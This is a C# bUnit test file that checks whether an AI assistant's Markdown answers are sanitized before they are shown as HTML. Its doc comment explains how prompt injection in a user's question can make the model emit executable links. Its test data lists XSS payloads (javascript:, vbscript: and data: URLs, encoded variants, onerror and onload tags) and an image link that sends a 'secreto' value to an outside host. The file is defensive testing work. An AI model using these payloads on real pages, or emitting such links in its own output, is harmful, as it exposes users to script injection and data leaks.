using AngleSharp.Dom;
using Bunit;
using CaeManager.Application.AsistenteIa.Queries.PreguntarAlAsistente;
using CaeManager.Application.Common;
using CaeManager.Domain.Common;
using CaeManager.Infrastructure.Comunicaciones;
using CaeManager.Web.Features.AsistenteIa;
using FluentAssertions;
using MediatR;
using Microsoft.Extensions.DependencyInjection;

namespace CaeManager.Web.Tests;

/// <summary>
/// La respuesta del asistente de IA se pinta como HTML (Markdown → Markdig →
/// <c>MarkupString</c>). Su texto lo escribe el modelo, pero lo gobierna quien
/// pregunta: una inyección de instrucciones en la pregunta basta para que la
/// respuesta traiga un enlace o una imagen con un esquema ejecutable. Markdig
/// no filtra esquemas —<c>DisableHtml()</c> solo neutraliza el HTML en
/// bruto—, así que el HTML final pasa además por el sanitizador de lista
/// blanca del producto (<see cref="ISanitizadorHtmlService"/>: http, https y
/// mailto).
///
/// Se prueba sobre el componente real, con el sanitizador real, para que el
/// test vea lo que llega al navegador y no una función suelta que el
/// componente podría dejar de llamar.
/// </summary>
public class AsistenteIaMarkdownSeguroTests : BunitContext
{
    private sealed class MediatorConRespuesta(string respuesta) : IMediator
    {
        public Task<TResponse> Send<TResponse>(IRequest<TResponse> request, CancellationToken cancellationToken = default) =>
            request is PreguntarAlAsistenteQuery
                ? Task.FromResult((TResponse)(object)Result.Exito(respuesta))
                : throw new NotSupportedException();

        public Task Send<TRequest>(TRequest request, CancellationToken cancellationToken = default) where TRequest : IRequest =>
            throw new NotSupportedException();

        public Task<object?> Send(object request, CancellationToken cancellationToken = default) =>
            throw new NotSupportedException();

        public IAsyncEnumerable<TResponse> CreateStream<TResponse>(IStreamRequest<TResponse> request, CancellationToken cancellationToken = default) =>
            throw new NotSupportedException();

        public IAsyncEnumerable<object?> CreateStream(object request, CancellationToken cancellationToken = default) =>
            throw new NotSupportedException();

        public Task Publish(object notification, CancellationToken cancellationToken = default) => Task.CompletedTask;

        public Task Publish<TNotification>(TNotification notification, CancellationToken cancellationToken = default)
            where TNotification : INotification => Task.CompletedTask;
    }

    private static readonly string[] EsquemasPermitidos = ["http:", "https:", "mailto:"];

    private IElement RespuestaRenderizada(string respuesta)
    {
        Services.AddLocalization();
        Services.AddScoped<AsistenteIaService>();
        Services.AddScoped<IMediator>(_ => new MediatorConRespuesta(respuesta));
        Services.AddSingleton<ISanitizadorHtmlService, GanssSanitizadorHtmlService>();
        JSInterop.Mode = JSRuntimeMode.Loose;

        var panel = Render<AsistenteIa>();
        panel.InvokeAsync(() => Services.GetRequiredService<AsistenteIaService>().Abrir());
        panel.Find("textarea.asistente-textarea").Input("¿Qué dice el RD 171/2004?");
        panel.Find("button.asistente-boton-enviar").Click();

        return panel.WaitForElement(".asistente-mensaje-markdown");
    }

    /// <summary>
    /// Invariante sobre todo el árbol de la respuesta: ningún manejador
    /// <c>on*</c>, ningún <c>script</c> ni <c>img</c>, y todo atributo que
    /// cargue una URL usa un esquema de la lista blanca.
    /// </summary>
    private static void SinNadaEjecutable(IElement respuesta)
    {
        var elementos = respuesta.QuerySelectorAll("*");
        elementos.Where(e => e.LocalName is "script" or "img" or "iframe" or "object" or "embed" or "svg")
            .Select(e => e.OuterHtml).Should().BeEmpty();

        foreach (var elemento in elementos)
        {
            foreach (var atributo in elemento.Attributes)
            {
                atributo.Name.Should().NotStartWith("on", $"«{elemento.OuterHtml}» no puede llevar manejadores");

                if (atributo.Name is "href" or "src" or "action" or "formaction" or "xlink:href")
                {
                    var valor = atributo.Value.Trim().ToLowerInvariant();
                    EsquemasPermitidos.Should().Contain(
                        esquema => valor.StartsWith(esquema),
                        $"«{elemento.OuterHtml}» solo puede enlazar con http, https o mailto");
                }
            }
        }
    }

    [Theory]
    [InlineData("[pincha](javascript:alert(1))")]
    [InlineData("[pincha](JaVaScRiPt:alert(1))")]
    [InlineData("[pincha]( javascript:alert(1) )")]
    [InlineData("[pincha](<javascript:alert(1)>)")]
    [InlineData("[pincha](&#106;avascript:alert(1))")]
    [InlineData("[pincha](javascript&#58;alert(1))")]
    [InlineData("[pincha](&#x6A;&#x61;vascript:alert(1))")]
    [InlineData("[pincha](java%73cript:alert(1))")]
    [InlineData("<javascript:alert(1)>")]
    [InlineData("[pincha][r]\n\n[r]: javascript:alert(1)")]
    [InlineData("[pincha](vbscript:msgbox(1))")]
    [InlineData("[pincha](VBScript:msgbox(1))")]
    [InlineData("[pincha](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)")]
    [InlineData("[pincha](DATA:text/html,<script>alert(1)</script>)")]
    [InlineData("![imagen](javascript:alert(1))")]
    [InlineData("![imagen](https://ajeno.example/pixel.png?q=secreto)")]
    [InlineData("![imagen](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+)")]
    public void Un_enlace_o_imagen_con_esquema_no_permitido_no_llega_al_html(string respuesta)
    {
        SinNadaEjecutable(RespuestaRenderizada(respuesta));
    }

    [Theory]
    [InlineData("<a href=javascript:alert(1)>pincha</a>", "<a href=javascript:alert(1)>")]
    [InlineData("<img src=x onerror=alert(1)>", "<img src=x onerror=alert(1)>")]
    [InlineData("<script>alert(1)</script>", "<script>")]
    [InlineData("<svg onload=alert(1)>", "<svg onload=alert(1)>")]
    [InlineData("texto <b onmouseover=alert(1)>en línea</b>", "<b onmouseover=alert(1)>")]
    public void El_html_en_bruto_se_muestra_como_texto_literal(string respuesta, string literal)
    {
        var html = RespuestaRenderizada(respuesta);

        SinNadaEjecutable(html);
        // DisableHtml(): el marcado no se interpreta ni se descarta en silencio —
        // quien lee la respuesta ve lo que el modelo escribió.
        html.TextContent.Should().Contain(literal);
    }

    [Fact]
    public void Los_enlaces_permitidos_y_el_formato_de_la_respuesta_se_conservan()
    {
        var html = RespuestaRenderizada(
            "## Respuesta\n\nTexto con **negrita** y `código`.\n\n- uno\n- dos\n\n" +
            "[BOE](https://www.boe.es/eli/es/rd/2004/01/30/171) · [web](http://example.com) · " +
            "[correo](mailto:prl@example.com)");

        html.QuerySelector("h2")!.TextContent.Should().Be("Respuesta");
        html.QuerySelector("strong")!.TextContent.Should().Be("negrita");
        html.QuerySelector("code")!.TextContent.Should().Be("código");
        html.QuerySelectorAll("li").Should().HaveCount(2);
        html.QuerySelectorAll("a").Select(a => a.GetAttribute("href")).Should().Equal(
            "https://www.boe.es/eli/es/rd/2004/01/30/171", "http://example.com", "mailto:prl@example.com");
        SinNadaEjecutable(html);
    }
}
